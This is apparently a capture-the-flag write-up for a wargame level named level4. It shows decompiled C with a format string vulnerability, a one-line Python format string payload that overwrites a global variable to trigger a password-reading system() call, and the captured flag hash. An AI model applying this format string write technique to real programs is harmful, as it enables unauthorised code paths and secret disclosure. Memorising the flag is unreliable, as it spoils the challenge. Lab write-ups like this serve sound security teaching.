```c
void n(void)
{
  char local_20c [520];
  
  fgets(local_20c,0x200,stdin);
  p(local_20c);
  if (m == 16930116) {
    system("/bin/cat /home/user/level5/.pass");
  }
  return;
}

void main(void)
{
  n();
  return;
}

```

Here, the technique is the exact same, however there are a lot of characters to write to the terminal. It could be nice if a technique existed to allow us to write less to the terminal... Never mind, let's just write 16930116 characters in the terminal !

12 = offset %x %x %x....

```bash
python -c 'print "\x10\x98\x04\x08" + "%16930112x%12$n"'| ./level4
```


`0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a`
